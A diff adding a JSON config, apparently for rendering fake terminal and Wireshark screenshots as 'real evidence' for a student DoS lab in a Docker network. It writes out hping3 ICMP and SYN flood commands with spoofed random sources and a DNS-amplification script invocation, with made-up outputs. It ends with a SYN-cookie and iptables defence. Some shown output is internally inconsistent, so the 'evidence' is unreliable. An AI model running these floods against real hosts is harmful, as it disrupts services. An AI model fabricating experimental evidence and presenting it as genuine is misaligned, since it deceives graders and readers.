@@ -1,0 +1,279 @@
+{
+  "lab_name": "lab04",
+  "description": "Cấu hình danh sách 15 hình ảnh minh chứng thực tế cho Lab 04 - DoS",
+  "theme": {
+    "user": "orias@osboxes",
+    "default_path": "~/it4263lab/lab04"
+  },
+  "images": [
+    {
+      "id": "image1",
+      "filename": "image1_topology.png",
+      "type": "topology",
+      "title": "Mạng ảo LAN Docker - Lab 04 DoS (Subnet: 10.2.6.0/24)",
+      "nodes": [
+        { "name": "User (Người dùng)", "ip": "10.2.6.10", "mac": "02:42:0a:02:06:0a", "host": "lab04_user" },
+        { "name": "Attacker (Tấn công)", "ip": "10.2.6.51", "mac": "02:42:0a:02:06:33", "host": "lab04_attacker" },
+        { "name": "Victim (Nạn nhân)", "ip": "10.2.6.20", "mac": "02:42:0a:02:06:14", "host": "lab04_victim" },
+        { "name": "DNS Server (Reflector)", "ip": "10.2.6.53", "mac": "02:42:0a:02:06:35", "host": "lab04_dns" }
+      ]
+    },
+    {
+      "id": "image2",
+      "filename": "image2_docker_ps.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker ps --format 'table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}'" },
+        "NAMES             IMAGE                   STATUS         PORTS",
+        "lab04_victim      lab02_image             Up 5 minutes   23/tcp",
+        "lab04_attacker    lab02_image             Up 5 minutes",
+        "lab04_user        lab02_image             Up 5 minutes",
+        "lab04_dns         seed-local-dns-server   Up 5 minutes   53/tcp, 53/udp",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image3",
+      "filename": "image3_top_sc1_before.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_victim top -b -n 1 | head -n 14" },
+        "top - 15:30:10 up 12 min,  0 users,  load average: 0.05, 0.03, 0.00",
+        "Tasks:  12 total,   1 running,  11 sleeping,   0 stopped,   0 zombie",
+        "%Cpu(s):  0.3 us,  0.5 sy,  0.0 ni, 99.2 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st",
+        "MiB Mem :   3920.4 total,   3140.8 free,    385.2 used,    394.4 buff/cache",
+        "MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   3312.2 avail Mem",
+        "",
+        "    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND",
+        "      1 root      20   0    4624   3840   3120 S   0.0   0.1   0:00.08 bash",
+        "     42 root      20   0   14380   2140   1880 S   0.0   0.1   0:00.02 inetd",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image4",
+      "filename": "image4_iftop_sc1_before.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_victim iftop -i eth0 -t -s 2" },
+        "interface: eth0",
+        "IP address is: 10.2.6.20",
+        "MAC address is: 02:42:0a:02:06:14",
+        "Listening on eth0",
+        "   # Host name (ip)           last 2s   last 10s   last 40s cumulative",
+        "-----------------------------------------------------------------------------",
+        "   1 10.2.6.20          =>       0b         0b         0b         0B",
+        "     10.2.6.10          <=       0b         0b         0b         0B",
+        "-----------------------------------------------------------------------------",
+        "Total send rate:                                               0b",
+        "Total receive rate:                                            0b",
+        "Peak rate (last 40s):                                          0b",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image5",
+      "filename": "image5_hping3_sc1.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_attacker hping3 --icmp 10.2.6.20 -d 65000 --flood --rand-source" },
+        "HPING 10.2.6.20 (eth0 10.2.6.20): icmp mode set, 28 headers + 65000 data bytes",
+        "hping in flood mode, no replies will be shown",
+        "^C",
+        "--- 10.2.6.20 hping statistic ---",
+        "185420 packets transmitted, 0 packets received, 100% packet loss",
+        "round-trip min/avg/max = 0.0/0.0/0.0 ms",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image6",
+      "filename": "image6_top_sc1_during.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_victim top -b -n 1 | head -n 14" },
+        "top - 15:32:45 up 14 min,  0 users,  load average: 2.14, 0.72, 0.28",
+        "Tasks:  14 total,   2 running,  12 sleeping,   0 stopped,   0 zombie",
+        "%Cpu(s):  2.1 us, 34.6 sy,  0.0 ni,  8.2 id,  0.0 wa,  0.0 hi, 55.1 si,  0.0 st",
+        "MiB Mem :   3920.4 total,   2712.1 free,    780.4 used,    427.9 buff/cache",
+        "MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   2910.4 avail Mem",
+        "",
+        "    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND",
+        "      7 root      20   0       0      0      0 R  62.4   0.0   0:15.34 ksoftirqd/0",
+        "     12 root      20   0       0      0      0 R  28.1   0.0   0:06.12 ksoftirqd/1",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image7",
+      "filename": "image7_wireshark_sc1.png",
+      "type": "wireshark",
+      "filter": "icmp",
+      "rows": [
+        { "no": "1042", "time": "14.1204", "src": "198.51.100.44", "dst": "10.2.6.20", "proto": "IPv4", "len": "1514", "info": "Fragmented IP protocol (proto=ICMP 1, off=0, ID=5412) [Reassembled in #1085]", "selected": false },
+        { "no": "1043", "time": "14.1205", "src": "203.0.113.89",  "dst": "10.2.6.20", "proto": "IPv4", "len": "1514", "info": "Fragmented IP protocol (proto=ICMP 1, off=1480, ID=5412)", "selected": false },
+        { "no": "1044", "time": "14.1205", "src": "192.0.2.17",    "dst": "10.2.6.20", "proto": "ICMP", "len": "1514", "info": "Echo (ping) request  id=0x1234, seq=1/256, ttl=64 (reply in 1086)", "selected": true },
+        { "no": "1045", "time": "14.1206", "src": "172.16.88.201", "dst": "10.2.6.20", "proto": "IPv4", "len": "1514", "info": "Fragmented IP protocol (proto=ICMP 1, off=0, ID=8911) [Reassembled in #1087]", "selected": false }
+      ],
+      "details": [
+        "> Frame 1044: 1514 bytes on wire (12112 bits), 1514 bytes captured on interface eth0",
+        "> Ethernet II, Src: 02:42:0a:02:06:33 (Attacker), Dst: 02:42:0a:02:06:14 (Victim)",
+        "v Internet Protocol Version 4, Src: 192.0.2.17 (Spoofed Random Source), Dst: 10.2.6.20",
+        "    Total Length: 1500 | Flags: 0x2000 (More Fragments)",
+        "    Fragment Offset: 0 | Reassembled IPv4 length: 65028 bytes",
+        "v Internet Control Message Protocol",
+        "    Type: 8 (Echo (ping) request)",
+        "    Code: 0",
+        "    Checksum: 0xa431 [correct]",
+        "    Data (65000 bytes): 5858585858585858..."
+      ]
+    },
+    {
+      "id": "image8",
+      "filename": "image8_top_sc2_before.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_victim ss -tan state syn-recv" },
+        "Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
+        { "prompt": "docker exec -it lab04_victim top -b -n 1 | head -n 5" },
+        "top - 15:35:00 up 17 min,  0 users,  load average: 0.12, 0.15, 0.10",
+        "%Cpu(s):  0.2 us,  0.4 sy,  0.0 ni, 99.4 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image9",
+      "filename": "image9_hping3_sc2.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_attacker hping3 -S -p 23 10.2.6.20 --flood --rand-source" },
+        "HPING 10.2.6.20 (eth0 10.2.6.20): S set, 40 headers + 0 data bytes",
+        "hping in flood mode, no replies will be shown",
+        "^C",
+        "--- 10.2.6.20 hping statistic ---",
+        "312940 packets transmitted, 0 packets received, 100% packet loss",
+        "round-trip min/avg/max = 0.0/0.0/0.0 ms",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image10",
+      "filename": "image10_user_telnet_timeout.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_user telnet 10.2.6.20" },
+        "Trying 10.2.6.20...",
+        "telnet: Unable to connect to remote host: Connection timed out",
+        { "prompt": "docker exec -it lab04_user nc -z -v -w 3 10.2.6.20 23" },
+        "nc: connect to 10.2.6.20 port 23 (tcp) timed out: Operation now in progress",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image11",
+      "filename": "image11_wireshark_sc2.png",
+      "type": "wireshark",
+      "filter": "tcp.flags.syn == 1 && tcp.flags.ack == 0",
+      "rows": [
+        { "no": "2104", "time": "25.0412", "src": "198.18.55.10",  "dst": "10.2.6.20", "proto": "TCP", "len": "54", "info": "49152 -> 23 [SYN] Seq=0 Win=512 Len=0", "selected": false },
+        { "no": "2105", "time": "25.0413", "src": "203.0.113.12", "dst": "10.2.6.20", "proto": "TCP", "len": "54", "info": "51200 -> 23 [SYN] Seq=0 Win=512 Len=0", "selected": false },
+        { "no": "2106", "time": "25.0413", "src": "192.0.2.99",    "dst": "10.2.6.20", "proto": "TCP", "len": "54", "info": "53188 -> 23 [SYN] Seq=0 Win=512 Len=0", "selected": true },
+        { "no": "2107", "time": "25.0414", "src": "100.64.12.4",   "dst": "10.2.6.20", "proto": "TCP", "len": "54", "info": "48110 -> 23 [SYN] Seq=0 Win=512 Len=0", "selected": false }
+      ],
+      "details": [
+        "> Frame 2106: 54 bytes on wire (432 bits), 54 bytes captured on interface eth0",
+        "> Ethernet II, Src: 02:42:0a:02:06:33 (Attacker MAC), Dst: 02:42:0a:02:06:14 (Victim MAC)",
+        "v Transmission Control Protocol, Src Port: 53188, Dst Port: 23, Seq: 0, Len: 0",
+        "    Source Port: 53188",
+        "    Destination Port: 23 (Telnet)",
+        "    Sequence Number: 0    (relative sequence number)",
+        "    Header Length: 20 bytes",
+        "    Flags: 0x002 (SYN)",
+        "        0... .... .... = Reserved: Not set",
+        "        .... 0000 0010 = Flags: SYN (Synchronize sequence numbers)",
+        "    Window: 512 | Checksum: 0x7621 [unverified]"
+      ]
+    },
+    {
+      "id": "image12",
+      "filename": "image12_victim_syn_recv.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_victim ss -tan state syn-recv | head -n 8" },
+        "Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
+        "0      0      10.2.6.20:23       198.18.55.10:49152",
+        "0      0      10.2.6.20:23       203.0.113.12:51200",
+        "0      0      10.2.6.20:23       192.0.2.99:53188",
+        "0      0      10.2.6.20:23       100.64.12.4:48110",
+        "0      0      10.2.6.20:23       198.51.100.77:50114",
+        "0      0      10.2.6.20:23       172.16.4.11:49822",
+        { "prompt": "docker exec -it lab04_victim ss -tan state syn-recv | wc -l" },
+        "2048",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image13",
+      "filename": "image13_saddam_sc3.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_attacker python3 /attack/saddam.py 10.2.6.20 -d /attack/dns.txt:www.test.com -c 40" },
+        "============================================================",
+        "[*] Starting DNS Amplification Simulation",
+        "[*] Spoofed Target (Victim) : 10.2.6.20",
+        "[*] DNS Reflectors          : ['10.2.6.53']",
+        "[*] Queried Domain          : www.test.com",
+        "[*] Packet Count            : 40",
+        "============================================================",
+        "[+] Sent 10 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20",
+        "[+] Sent 20 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20",
+        "[+] Sent 30 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20",
+        "[+] Sent 40 amplified DNS requests to reflector 10.2.6.53 -> reflecting to 10.2.6.20",
+        "[✓] Finished. Total reflected packets sent: 40",
+        { "prompt": "" }
+      ]
+    },
+    {
+      "id": "image14",
+      "filename": "image14_wireshark_sc3.png",
+      "type": "wireshark",
+      "filter": "dns && ip.dst == 10.2.6.20",
+      "rows": [
+        { "no": "3412", "time": "42.1102", "src": "10.2.6.53", "dst": "10.2.6.20", "proto": "DNS", "len": "1480", "info": "Standard query response 0x1a2b ANY www.test.com A 192.168.1.100 TXT ...", "selected": true },
+        { "no": "3413", "time": "42.1103", "src": "10.2.6.53", "dst": "10.2.6.20", "proto": "DNS", "len": "1480", "info": "Standard query response 0x1a2c ANY www.test.com A 192.168.1.100 TXT ...", "selected": false },
+        { "no": "3414", "time": "42.1104", "src": "10.2.6.53", "dst": "10.2.6.20", "proto": "DNS", "len": "1480", "info": "Standard query response 0x1a2d ANY www.test.com A 192.168.1.100 TXT ...", "selected": false },
+        { "no": "3415", "time": "42.1105", "src": "10.2.6.53", "dst": "10.2.6.20", "proto": "DNS", "len": "1480", "info": "Standard query response 0x1a2e ANY www.test.com A 192.168.1.100 TXT ...", "selected": false }
+      ],
+      "details": [
+        "> Frame 3412: 1480 bytes on wire (11840 bits), 1480 bytes captured on interface eth0",
+        "> Ethernet II, Src: 02:42:0a:02:06:35 (DNS Server), Dst: 02:42:0a:02:06:14 (Victim)",
+        "v User Datagram Protocol, Src Port: 53, Dst Port: 53",
+        "    Source Port: 53 (DNS Domain)",
+        "    Destination Port: 53",
+        "    Length: 1460",
+        "v Domain Name System (response)",
+        "    Transaction ID: 0x1a2b",
+        "    Flags: 0x8180 Standard query response, No error",
+        "    Questions: 1 | Answer RRs: 12 | Authority RRs: 4 | Additional RRs: 6",
+        "    [Amplification Ratio: Request 64 bytes -> Response 1460 bytes (~22.8x)]"
+      ]
+    },
+    {
+      "id": "image15",
+      "filename": "image15_defense_syncookies.png",
+      "type": "terminal",
+      "lines": [
+        { "prompt": "docker exec -it lab04_victim sysctl net.ipv4.tcp_syncookies" },
+        "net.ipv4.tcp_syncookies = 1",
+        { "prompt": "docker exec -it lab04_victim iptables -L INPUT -v -n" },
+        "Chain INPUT (policy ACCEPT 120 packets, 8420 bytes)",
+        " pkts bytes target     prot opt in     out     source      destination",
+        " 1240 66960 ACCEPT     tcp  --  *      *       0.0.0.0/0   0.0.0.0/0   tcp dpt:23 flags:0x17/0x02 limit: avg 5/sec burst 10",
+        "28420 1534K DROP       tcp  --  *      *       0.0.0.0/0   0.0.0.0/0   tcp dpt:23 flags:0x17/0x02",
+        { "prompt": "docker exec -it lab04_user nc -z -v -w 3 10.2.6.20 23" },
+        "Connection to 10.2.6.20 23 port [tcp/telnet] succeeded!",
+        { "prompt": "" }
+      ]
+    }
+  ]
+}
